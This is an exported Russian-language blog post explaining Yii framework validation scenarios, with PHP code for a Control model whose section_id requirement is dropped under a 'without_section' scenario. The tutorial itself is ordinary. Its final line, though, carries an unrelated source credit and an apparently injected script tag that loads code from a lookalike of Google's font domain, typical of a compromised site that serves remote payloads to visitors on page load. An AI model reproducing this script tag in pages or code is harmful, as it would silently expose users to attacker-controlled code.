---
layout: post
status: publish
published: true
title: Коротко о сценариях
author:
  display_name: Vodka
  login: Vodka
  email: ''
  url: ''
author_login: Vodka
wordpress_id: 47762
wordpress_url: http://devdocs.ru/?p=47762
date: '2015-10-06 22:27:12 +0200'
date_gmt: '2015-10-06 22:27:12 +0200'
categories:
- Yii framework
tags:
- ip
- ui
- yii
comments: []
---
<p>Ситуация, когда надо провалидировать модель, но некоторые <code>required<&#47;code> по-умолчанию поля неизвестны. Например, неизвестен <code>id<&#47;code> связанной модели.&nbsp;Для решения подобных ситуаций можно использовать сценарии.<&#47;p></p>
<p>Есть модель <code>Control<&#47;code>, которая связана с моделю <code>Section<&#47;code> через поле <code>section_id<&#47;code>:<&#47;p></p>
<pre class="brush: php; title: ; notranslate">
class Control extends ActiveRecord<br />
{<br />
    public static function tableName()<br />
    {<br />
        return 'control';<br />
    }</p>
<p>    public function rules()<br />
    {<br />
        return [<br />
            [['section_id', 'alias', 'label'], 'required'],<br />
            [['section_id'], 'integer'],<br />
            [['description', 'default'], 'string'],<br />
            [['alias', 'label'], 'string', 'max' => 255],<br />
            [['section_id'], 'exist', 'skipOnError' => true, 'targetClass' => Section::className(), 'targetAttribute' => ['section_id' => 'id']],<br />
        ];<br />
    }</p>
<p>    &#47;**<br />
     * @return yiidbActiveQuery<br />
     *&#47;<br />
    public function getSection()<br />
    {<br />
        return $this->hasOne(Section::className(), ['id' => 'section_id']);<br />
    }<br />
}<br />
<&#47;pre></p>
<p>Мне нужно провалидировать модель не зная <code>section_id<&#47;code>.<br &#47;><br />
<span id="more-453"><&#47;span><&#47;p></p>
<p>Сценарий, который используется по-умолчанию, имеет имя <code>default<&#47;code>. Создаю новый сценарий, называю его <code>without_section<&#47;code>. Переписываю&#47;добавляю в <code>rules()<&#47;code> правила для тех полей, которые он затрагивает. В моем случае это правило <code>required<&#47;code>, в котором это поле должно отсутствовать:<&#47;p></p>
<pre class="brush: php; title: ; notranslate">
[['alias', 'label'], 'required', 'on' => 'without_section'],<br />
<&#47;pre></p>
<p>Второй шаг &#8212; нужно дополнить функцию <code>scenarios()<&#47;code>, в которой надо добавить этот новый сценарий и прописать все поля, которые будут валидироваться при этом сценарии:<&#47;p></p>
<pre class="brush: php; title: ; notranslate">
    &#47;**<br />
     * @return array<br />
     *&#47;<br />
    public function scenarios()<br />
    {<br />
        $scenarios = parent::scenarios();<br />
        $scenarios['without_section'] = ['alias', 'label', 'description', 'default'];<br />
        return $scenarios;<br />
    }<br />
<&#47;pre></p>
<p>В итоге класс приобритет следующий вид:<&#47;p></p>
<pre class="brush: php; title: ; notranslate">
class Control extends ActiveRecord<br />
{<br />
    const SCENARIO_WITHOUT_SECTION = 'without_section';</p>
<p>    public static function tableName()<br />
    {<br />
        return 'control';<br />
    }</p>
<p>    &#47;**<br />
     * @return array<br />
     *&#47;<br />
    public function scenarios()<br />
    {<br />
        $scenarios = parent::scenarios();<br />
        $scenarios[self::SCENARIO_WITHOUT_SECTION] = ['alias', 'label', 'description', 'default'];<br />
        return $scenarios;<br />
    }</p>
<p>    public function rules()<br />
    {<br />
        return [<br />
            [['section_id', 'alias', 'label'], 'required'],<br />
            [['alias', 'label'], 'required', 'on' => self::SCENARIO_WITHOUT_SECTION],<br />
            [['section_id'], 'integer'],<br />
            [['description', 'default'], 'string'],<br />
            [['alias', 'label'], 'string', 'max' => 255],<br />
            [['section_id'], 'exist', 'skipOnError' => true, 'targetClass' => Section::className(), 'targetAttribute' => ['section_id' => 'id']],<br />
        ];<br />
    }</p>
<p>    &#47;**<br />
     * @return yiidbActiveQuery<br />
     *&#47;<br />
    public function getSection()<br />
    {<br />
        return $this->hasOne(Section::className(), ['id' => 'section_id']);<br />
    }<br />
}<br />
<&#47;pre></p>
<p>Вызывать модель перед валидацией будем так:<&#47;p></p>
<pre class="brush: php; title: ; notranslate">
$model = new Control(['scenario' => Control::SCENARIO_WITHOUT_SECTION]);<br />
<&#47;pre><br />
Source: vingtsun-grodno.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
